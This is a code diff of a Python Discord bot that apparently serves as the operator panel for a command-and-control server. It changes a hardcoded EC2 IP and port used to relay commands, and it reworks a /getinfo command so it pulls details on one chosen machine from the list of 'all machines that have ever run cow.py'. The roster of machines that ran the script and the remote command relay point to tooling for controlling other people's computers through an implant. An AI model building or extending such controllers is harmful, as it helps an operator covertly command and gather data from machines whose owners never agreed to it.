@@ -7,13 +7,16 @@ import os
 import socket
 
 def connect(command):
-    ip = '3.26.216.143'
+    ip = '54.79.26.131'  # your EC2 IP
     port = 4570
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.connect((ip, port))
-
     server.send(command.encode())
-    response = server.recv(4096).decode()
+
+    try:
+        response = server.recv(8192).decode()
+    except:
+        response = "No response"
     server.close()
     return response
 
@@ -32,13 +35,24 @@ async def on_ready():
     await bot.tree.sync()   
 
 @bot.tree.command(name="getinfo", description="Get info of cows")
-async def getInfo(interaction: discord.Interaction):
-    await interaction.response.send_message("Attempting to get info...")
+@app_commands.describe(machine_number="Index of the machine from /listcows (starts at 1)")
+async def getInfo(interaction: discord.Interaction, machine_number: int):
+    await interaction.response.send_message("Grabbing info...", ephemeral=True)
 
-    info = connect(":GETINFO")
-    
-    # Send the result as a code block (for formatting)
-    await interaction.followup.send(f"```{info}```")
+    # Get all machine info blocks
+    info_raw = connect(":GETINFO")
+
+    # Each machine block starts with [
+    machine_blocks = [block.strip() for block in info_raw.strip().split("[") if block]
+
+    if machine_number < 1 or machine_number > len(machine_blocks):
+        await interaction.followup.send("❌ Invalid machine number. Use `/listcows` to see valid options.")
+        return
+
+    selected_block = machine_blocks[machine_number - 1]
+    final_display = "[" + selected_block  # re-add removed `[` for formatting
+
+    await interaction.followup.send(f"```{final_display}```")
 
 @bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
 async def listCows(interaction: discord.Interaction):
